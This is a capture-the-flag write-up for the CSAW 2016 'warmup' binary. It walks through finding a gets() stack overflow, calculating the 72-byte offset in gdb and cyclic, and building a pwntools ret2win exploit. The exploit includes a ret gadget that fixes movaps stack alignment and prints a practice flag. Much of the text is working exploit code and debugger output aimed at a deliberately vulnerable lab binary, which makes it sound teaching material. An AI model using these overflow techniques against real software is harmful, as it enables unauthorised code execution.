### Binary Exploitation

### Source: CSAW_16

### Basic File Check

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ chmod +x warmup 
                                                                                                                                                                                                                  
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ file warmup 
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
                                                                                                                                                                                                                  
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ checksec warmup 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Documents/Pentest/BOF/03-begineer_bof/warmup/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Its a x64 binary which is not stripped and it also has nx enabled

I'll run it to know what it does

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ ./warmup 
-Warm Up-
WOW:0x40060d
>wiw
                                                                                                                                                                                                                  
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ ./warmup
-Warm Up-
WOW:0x40060d
>lol
                                                                                                                                                                                                                  
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ ./warmup
-Warm Up-
WOW:0x40060d
>test 
```

It just prints out a memory address which seems to be always the same then it exit on receiving the user's input

I'll decompile the binary using ghidra

```

void main(void)

{
  char easyFuncAddr [64];
  char input [64];
  
  write(1,"-Warm Up-\n",10);
  write(1,&DAT_0040074c,4);
  sprintf(easyFuncAddr,"%p\n",easy);
  write(1,easyFuncAddr,9);
  write(1,&DAT_00400755,1);
  gets(input);
  return;
}
```

The main funtion doesn't really do much

Here's what it does

```
1. Prints out the banner stuff
2. Then it prints out the easy function address
3. It then receives input using get and exit
```

The vulnerability here is the usage of get as it doesn't limit the amount of bytes it scan 

And since the input has a buffer of 64 if we give it more than 64 lets say 100 we get a segmentation fault

There's another function called `easy`

Here's the decompiled code

```

void easy(void)

{
  system("cat flag.txt");
  return;
}
```

It doesn't do much but thats what we need 

```
1. It calls system which then cats the flag 
2. After that it exits
```

So know we have an idea of what this is about 

Our aim is to overwrite the eip to call the easy function

Lets hope on to gdb to get the offset

I'll set a breakpoint immediately after the gets call

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ gdb -q warmup         
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.11
Reading symbols from warmup...
(No debugging symbols found in warmup)
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040061d <+0>:     push   rbp
   0x000000000040061e <+1>:     mov    rbp,rsp
   0x0000000000400621 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400625 <+8>:     mov    edx,0xa
   0x000000000040062a <+13>:    mov    esi,0x400741
   0x000000000040062f <+18>:    mov    edi,0x1
   0x0000000000400634 <+23>:    call   0x4004c0 <write@plt>
   0x0000000000400639 <+28>:    mov    edx,0x4
   0x000000000040063e <+33>:    mov    esi,0x40074c
   0x0000000000400643 <+38>:    mov    edi,0x1
   0x0000000000400648 <+43>:    call   0x4004c0 <write@plt>
   0x000000000040064d <+48>:    lea    rax,[rbp-0x80]
   0x0000000000400651 <+52>:    mov    edx,0x40060d
   0x0000000000400656 <+57>:    mov    esi,0x400751
   0x000000000040065b <+62>:    mov    rdi,rax
   0x000000000040065e <+65>:    mov    eax,0x0
   0x0000000000400663 <+70>:    call   0x400510 <sprintf@plt>
   0x0000000000400668 <+75>:    lea    rax,[rbp-0x80]
   0x000000000040066c <+79>:    mov    edx,0x9
   0x0000000000400671 <+84>:    mov    rsi,rax
   0x0000000000400674 <+87>:    mov    edi,0x1
   0x0000000000400679 <+92>:    call   0x4004c0 <write@plt>
   0x000000000040067e <+97>:    mov    edx,0x1
   0x0000000000400683 <+102>:   mov    esi,0x400755
   0x0000000000400688 <+107>:   mov    edi,0x1
   0x000000000040068d <+112>:   call   0x4004c0 <write@plt>
   0x0000000000400692 <+117>:   lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:   mov    rdi,rax
   0x0000000000400699 <+124>:   mov    eax,0x0
   0x000000000040069e <+129>:   call   0x400500 <gets@plt>
   0x00000000004006a3 <+134>:   leave  
   0x00000000004006a4 <+135>:   ret    
End of assembler dump.
gef➤  b *0x00000000004006a3
Breakpoint 1 at 0x4006a3
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/warmup/warmup 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Warm Up-
WOW:0x40060d
>000000000000000000000

Breakpoint 1, 0x00000000004006a3 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffddc0  →  "000000000000000000000"
$rbx   : 0x007fffffffdf18  →  0x007fffffffe276  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/w[...]"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad2288
$rdx   : 0x1               
$rsp   : 0x007fffffffdd80  →  "0x40060d\n"
$rbp   : 0x007fffffffde00  →  0x0000000000000001
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x000000004006a3  →  <main+134> leave 
$r8    : 0x000000006022b6  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf28  →  0x007fffffffe2b5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd80│+0x0000: "0x40060d\n"   ← $rsp
0x007fffffffdd88│+0x0008: 0x800000000000000a ("\n"?)
0x007fffffffdd90│+0x0010: 0x0000000000000000
0x007fffffffdd98│+0x0018: 0x0000000000000000
0x007fffffffdda0│+0x0020: 0x0000000000000000
0x007fffffffdda8│+0x0028: 0x0000000000000000
0x007fffffffddb0│+0x0030: 0x0000000000000000
0x007fffffffddb8│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400696 <main+121>       mov    rdi, rax
     0x400699 <main+124>       mov    eax, 0x0
     0x40069e <main+129>       call   0x400500 <gets@plt>
 →   0x4006a3 <main+134>       leave  
     0x4006a4 <main+135>       ret    
     0x4006a5                  cs     nop WORD PTR [rax+rax*1+0x0]
     0x4006af                  nop    
     0x4006b0 <__libc_csu_init+0> push   r15
     0x4006b2 <__libc_csu_init+2> mov    r15d, edi
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped 0x4006a3 in main (), reason: BREAKPOINT
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a3 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

Now i'll search for where the input we gave it is on the stack and also get the address of the rip

```
gef➤  search-pattern 000000000000000000000
[+] Searching '000000000000000000000' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6022a0 - 0x6022b7  →   "000000000000000000000\n" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffddc0 - 0x7fffffffddd5  →   "000000000000000000000" 
gef➤  info frame
Stack level 0, frame at 0x7fffffffde10:
 rip = 0x4006a3 in main; saved rip = 0x7ffff7df018a
 Arglist at 0x7fffffffde00, args: 
 Locals at 0x7fffffffde00, Previous frame's sp is 0x7fffffffde10
 Saved registers:
  rbp at 0x7fffffffde00, rip at 0x7fffffffde08
gef➤ 
```

Now lets do the math

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ python3           
Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x7fffffffde08 - 0x7fffffffddc0)
'0x48'
>>>
```

Nice know we know the offset is 0x48 i.e the amount of bytes needed to reach and overwrite the rip

Also this can be done using cyclic 

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ cyclic 100    
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
                                                                                                                                                                                                                  
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ gdb -q warmup
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.02ms using Python engine 3.11
Reading symbols from warmup...
(No debugging symbols found in warmup)
gef➤  r
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/warmup/warmup 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Warm Up-
WOW:0x40060d
>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006a4 in main ()































[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffddc0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$rbx   : 0x007fffffffdf18  →  0x007fffffffe276  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/w[...]"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad2288
$rdx   : 0x1               
$rsp   : 0x007fffffffde08  →  "saaataaauaaavaaawaaaxaaayaaa"
$rbp   : 0x6161617261616171 ("qaaaraaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x000000004006a4  →  <main+135> ret 
$r8    : 0x00000000602305  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf28  →  0x007fffffffe2b5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde08│+0x0000: "saaataaauaaavaaawaaaxaaayaaa"         ← $rsp
0x007fffffffde10│+0x0008: "uaaavaaawaaaxaaayaaa"
0x007fffffffde18│+0x0010: "waaaxaaayaaa"
0x007fffffffde20│+0x0018: 0x00000061616179 ("yaaa"?)
0x007fffffffde28│+0x0020: 0x007fffffffdf18  →  0x007fffffffe276  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/w[...]"
0x007fffffffde30│+0x0028: 0x007fffffffdf18  →  0x007fffffffe276  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/w[...]"
0x007fffffffde38│+0x0030: 0x250128de3ae57426
0x007fffffffde40│+0x0038: 0x0000000000000000
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400699 <main+124>       mov    eax, 0x0
     0x40069e <main+129>       call   0x400500 <gets@plt>
     0x4006a3 <main+134>       leave  
 →   0x4006a4 <main+135>       ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped 0x4006a4 in main (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a4 → main()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  q
                                                                                                                                                                                                                  
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ cyclic -l saaa
72
                                                                                                                                                                                                                  
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ python3 
Python 3.10.8 (main, Oct 24 2022, 10:07:16) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x48
72
>>> 
```

We see its the same anyways lets move on

Now that we have the offset and the address for the easy func lets craft the exploit

```
from pwn import *

io = process('./warmup')
#gdb.attach(io, gdbscript = 'b *0x4006a3')
overflow = b"A"*72
addr = p64(0x40060d)
payload = overflow + addr 
io.sendline(payload)
io.send('\n')

io.interactive(

```

On running it i gives segmentation fault

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ python2 exploit.py              
[+] Starting local process './warmup': pid 61741
[*] Switching to interactive mode
-Warm Up-
WOW:0x40060d
>[*] Got EOF while reading in interactive
$ 
[*] Process './warmup' stopped with exit code -11 (SIGSEGV) (pid 61741)
[*] Got EOF while sending in interactive
```

I'll debug it using gdb and setting a breakpoint after the get call

```
Payload: 

from pwn import *

payload = "A" * 72
#junk = "B" * 5
addr = p64(0x40060d)
pwned = payload + addr
print(pwned)
```

Now i'll run it

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ python2 overwrite.py > overwrite
```

With this lets open up gdb

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ gdb -q warmup
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.00ms using Python engine 3.11
Reading symbols from warmup...
(No debugging symbols found in warmup)
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040061d <+0>:     push   rbp
   0x000000000040061e <+1>:     mov    rbp,rsp
   0x0000000000400621 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400625 <+8>:     mov    edx,0xa
   0x000000000040062a <+13>:    mov    esi,0x400741
   0x000000000040062f <+18>:    mov    edi,0x1
   0x0000000000400634 <+23>:    call   0x4004c0 <write@plt>
   0x0000000000400639 <+28>:    mov    edx,0x4
   0x000000000040063e <+33>:    mov    esi,0x40074c
   0x0000000000400643 <+38>:    mov    edi,0x1
   0x0000000000400648 <+43>:    call   0x4004c0 <write@plt>
   0x000000000040064d <+48>:    lea    rax,[rbp-0x80]
   0x0000000000400651 <+52>:    mov    edx,0x40060d
   0x0000000000400656 <+57>:    mov    esi,0x400751
   0x000000000040065b <+62>:    mov    rdi,rax
   0x000000000040065e <+65>:    mov    eax,0x0
   0x0000000000400663 <+70>:    call   0x400510 <sprintf@plt>
   0x0000000000400668 <+75>:    lea    rax,[rbp-0x80]
   0x000000000040066c <+79>:    mov    edx,0x9
   0x0000000000400671 <+84>:    mov    rsi,rax
   0x0000000000400674 <+87>:    mov    edi,0x1
   0x0000000000400679 <+92>:    call   0x4004c0 <write@plt>
   0x000000000040067e <+97>:    mov    edx,0x1
   0x0000000000400683 <+102>:   mov    esi,0x400755
   0x0000000000400688 <+107>:   mov    edi,0x1
   0x000000000040068d <+112>:   call   0x4004c0 <write@plt>
   0x0000000000400692 <+117>:   lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:   mov    rdi,rax
   0x0000000000400699 <+124>:   mov    eax,0x0
   0x000000000040069e <+129>:   call   0x400500 <gets@plt>
   0x00000000004006a3 <+134>:   leave  
   0x00000000004006a4 <+135>:   ret    
End of assembler dump.
gef➤  b *main+134
Breakpoint 1 at 0x4006a3
```

Now i'll run it giving the payload we created which is meant to overwrite the rip to return to the easy func

```
gef➤  r < overwrite
Starting program: /home/mark/Documents/Pentest/BOF/03-begineer_bof/warmup/warmup < overwrite
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
-Warm Up-
WOW:0x40060d
>
Breakpoint 1, 0x00000000004006a3 in main ()










































[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007fffffffddc0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbx   : 0x007fffffffdf18  →  0x007fffffffe276  →  "/home/mark/Documents/Pentest/BOF/03-begineer_bof/w[...]"
$rcx   : 0x007ffff7f9ba80  →  0x00000000fbad2088
$rdx   : 0x1               
$rsp   : 0x007fffffffdd80  →  "0x40060d\n"
$rbp   : 0x007fffffffde00  →  0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9da20  →  0x0000000000000000
$rip   : 0x000000004006a3  →  <main+134> leave 
$r8    : 0x000000006022f1  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x1000            
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf28  →  0x007fffffffe2b5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd80│+0x0000: "0x40060d\n"   ← $rsp
0x007fffffffdd88│+0x0008: 0x800000000000000a ("\n"?)
0x007fffffffdd90│+0x0010: 0x0000000000000000
0x007fffffffdd98│+0x0018: 0x0000000000000000
0x007fffffffdda0│+0x0020: 0x0000000000000000
0x007fffffffdda8│+0x0028: 0x0000000000000000
0x007fffffffddb0│+0x0030: 0x0000000000000000
0x007fffffffddb8│+0x0038: 0x0000000000000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400696 <main+121>       mov    rdi, rax
     0x400699 <main+124>       mov    eax, 0x0
     0x40069e <main+129>       call   0x400500 <gets@plt>
 →   0x4006a3 <main+134>       leave  
     0x4006a4 <main+135>       ret    
     0x4006a5                  cs     nop WORD PTR [rax+rax*1+0x0]
     0x4006af                  nop    
     0x4006b0 <__libc_csu_init+0> push   r15
     0x4006b2 <__libc_csu_init+2> mov    r15d, edi
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped 0x4006a3 in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a3 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

So i'll check the current address we are on now

```
gef➤  disass main
Dump of assembler code for function main:
   0x000000000040061d <+0>:     push   rbp
   0x000000000040061e <+1>:     mov    rbp,rsp
   0x0000000000400621 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400625 <+8>:     mov    edx,0xa
   0x000000000040062a <+13>:    mov    esi,0x400741
   0x000000000040062f <+18>:    mov    edi,0x1
   0x0000000000400634 <+23>:    call   0x4004c0 <write@plt>
   0x0000000000400639 <+28>:    mov    edx,0x4
   0x000000000040063e <+33>:    mov    esi,0x40074c
   0x0000000000400643 <+38>:    mov    edi,0x1
   0x0000000000400648 <+43>:    call   0x4004c0 <write@plt>
   0x000000000040064d <+48>:    lea    rax,[rbp-0x80]
   0x0000000000400651 <+52>:    mov    edx,0x40060d
   0x0000000000400656 <+57>:    mov    esi,0x400751
   0x000000000040065b <+62>:    mov    rdi,rax
   0x000000000040065e <+65>:    mov    eax,0x0
   0x0000000000400663 <+70>:    call   0x400510 <sprintf@plt>
   0x0000000000400668 <+75>:    lea    rax,[rbp-0x80]
   0x000000000040066c <+79>:    mov    edx,0x9
   0x0000000000400671 <+84>:    mov    rsi,rax
   0x0000000000400674 <+87>:    mov    edi,0x1
   0x0000000000400679 <+92>:    call   0x4004c0 <write@plt>
   0x000000000040067e <+97>:    mov    edx,0x1
   0x0000000000400683 <+102>:   mov    esi,0x400755
   0x0000000000400688 <+107>:   mov    edi,0x1
   0x000000000040068d <+112>:   call   0x4004c0 <write@plt>
   0x0000000000400692 <+117>:   lea    rax,[rbp-0x40]
   0x0000000000400696 <+121>:   mov    rdi,rax
   0x0000000000400699 <+124>:   mov    eax,0x0
   0x000000000040069e <+129>:   call   0x400500 <gets@plt>
=> 0x00000000004006a3 <+134>:   leave  
   0x00000000004006a4 <+135>:   ret    
End of assembler dump.
gef➤ 
```

And we're in *0x00000000004006a3 

From here i'll enter `nexti` 2 times and we're expecting the return address to change to the easy func

```
gef➤  disass easy
Dump of assembler code for function easy:
=> 0x000000000040060d <+0>:     push   rbp
   0x000000000040060e <+1>:     mov    rbp,rsp
   0x0000000000400611 <+4>:     mov    edi,0x400734
   0x0000000000400616 <+9>:     call   0x4004d0 <system@plt>
   0x000000000040061b <+14>:    pop    rbp
   0x000000000040061c <+15>:    ret    
End of assembler dump.
gef➤
```

Cool now we're in the easy func

Lets continue moving unto the next instruction

```
gef➤  nexti

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7e15013 in do_system (line=0x400734 "cat flag.txt") at ../sysdeps/posix/system.c:148
148     ../sysdeps/posix/system.c: No such file or directory.
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x007ffff7fa3320  →  0x007fffffffdf28  →  0x007fffffffe2b5  →  "COLORFGBG=15;0"
$rbx   : 0x007fffffffdc78  →  0x0000000000000c ("
                                                 "?)
$rcx   : 0x007fffffffdc78  →  0x0000000000000c ("
                                                 "?)
$rdx   : 0x0               
$rsp   : 0x007fffffffda68  →  0x000000006022f1  →  0x0000000000000000
$rbp   : 0x007fffffffdad8  →  0x0000000000000000
$rsi   : 0x007ffff7f5f031  →  0x68732f6e69622f ("/bin/sh"?)
$rdi   : 0x007fffffffda74  →  0xf7fc316000000000
$rip   : 0x007ffff7e15013  →  <do_system+339> movaps XMMWORD PTR [rsp+0x50], xmm0
$r8    : 0x007fffffffdab8  →  0x007ffff7e5ee22  →  <__default_morecore+18> cmp rax, 0xffffffffffffffff
$r9    : 0x007fffffffdf28  →  0x007fffffffe2b5  →  "COLORFGBG=15;0"
$r10   : 0x8               
$r11   : 0x246             
$r12   : 0x00000000400734  →  "cat flag.txt"
$r13   : 0x007fffffffdf28  →  0x007fffffffe2b5  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffda68│+0x0000: 0x000000006022f1  →  0x0000000000000000        ← $rsp
0x007fffffffda70│+0x0008: 0x00000000ffffffff
0x007fffffffda78│+0x0010: 0x007ffff7fc3160  →  0x007ffff7dc9000  →  0x03010102464c457f
0x007fffffffda80│+0x0018: 0x0000000000000d ("\r"?)
0x007fffffffda88│+0x0020: 0x007ffff7f9b198  →  0x007ffff7fe18c0  →  <_dl_audit_preinit+0> mov eax, DWORD PTR [rip+0x1b552]        # 0x7ffff7ffce18 <_rtld_global_ro+888>
0x007fffffffda90│+0x0028: 0x007fffffffdf28  →  0x007fffffffe2b5  →  "COLORFGBG=15;0"
0x007fffffffda98│+0x0030: 0x0000ffff00001f80
0x007fffffffdaa0│+0x0038: 0x007ffff7f9bc60  →  0x0000000000000000
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7e15004 <do_system+324>  mov    QWORD PTR [rsp+0x60], r12
   0x7ffff7e15009 <do_system+329>  mov    r9, QWORD PTR [rax]
   0x7ffff7e1500c <do_system+332>  lea    rsi, [rip+0x14a01e]        # 0x7ffff7f5f031
 → 0x7ffff7e15013 <do_system+339>  movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7ffff7e15018 <do_system+344>  mov    QWORD PTR [rsp+0x68], 0x0
   0x7ffff7e15021 <do_system+353>  call   0x7ffff7ebf800 <__GI___posix_spawn>
   0x7ffff7e15026 <do_system+358>  mov    rdi, rbx
   0x7ffff7e15029 <do_system+361>  mov    r12d, eax
   0x7ffff7e1502c <do_system+364>  call   0x7ffff7ebf700 <__posix_spawnattr_destroy>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "warmup", stopped 0x7ffff7e15013 in do_system (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7e15013 → do_system(line=0x400734 "cat flag.txt")
[#1] 0x40061b → easy()
[#2] 0x7fffffffdf00 → or bh, bl
[#3] 0x40061d → easy()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

We received segfault at address `0x000000000040061b` 

Now lets check the reason out

This is the result i got from gdb

```
0x00007ffff7e15013 in do_system (line=0x400734 "cat flag.txt") 
```

And from this address `0x00007ffff7e15013` lets see the instruction it tried to run

```
$rip   : 0x007ffff7e15013  →  <do_system+339> movaps XMMWORD PTR [rsp+0x50], xmm0
```

Now we see that the problem is caused from `Movaps stack alignment`

Here's the resource that helped me out [Resource](https://ropemporium.com/guide.html)

So whats basically happening here is that the stack isn't 16byte aligned before it calls do_system 

Here's what we need for the fix

```
The solution is to call the ret of the other address one more time before calling the easy() function when designing the overflow stack, so that the rsp address can be reduced by 8
```

I'll use ropper to get a return address

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ ropper --file warmup --search "ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret

[INFO] File: warmup
0x0000000000400595: ret 0xc148; 
0x00000000004004a1: ret; 
```

Cool we have a return address lets now recreate the exploit

```
from pwn import *

io = process('./warmup')
#gdb.attach(io, gdbscript = 'b *0x4006a3')
overflow = b"A"*72
valid_ret = p64(0x00000000004004a1)
addr = p64(0x40060d)
payload = overflow + valid_ret + addr 
io.sendline(payload)
io.send('\n')

io.interactive()

```

Now lets run it

```
┌──(venv)─(mark㉿haxor)-[~/…/Pentest/BOF/03-begineer_bof/warmup]
└─$ python2 exploit.py
[+] Starting local process './warmup': pid 66481
[*] Switching to interactive mode
-Warm Up-
WOW:0x40060d
>FLAG{fake_flag_for_learning}
[*] Got EOF while reading in interactive
$ 
[*] Process './warmup' stopped with exit code -11 (SIGSEGV) (pid 66481)
[*] Got EOF while sending in interactive
```

And we're done 

<br> <br>
[Back_To_Home](../../index.md)
</br>

